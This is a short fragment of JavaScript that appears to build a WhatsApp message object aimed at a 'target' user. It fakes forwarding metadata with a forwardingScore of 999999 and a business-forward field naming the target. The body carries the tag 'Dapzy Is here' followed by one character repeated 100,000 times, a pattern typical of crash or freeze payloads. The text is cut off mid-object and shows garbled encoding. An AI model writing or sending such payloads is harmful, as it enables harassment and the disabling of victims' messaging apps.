          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "à¼‘âŒâƒ°Dapzy Is hereà½€â€Œâ€ŒðŸ¦ " + "ê¦¾".repeat(100000), // Encore plus de texte !
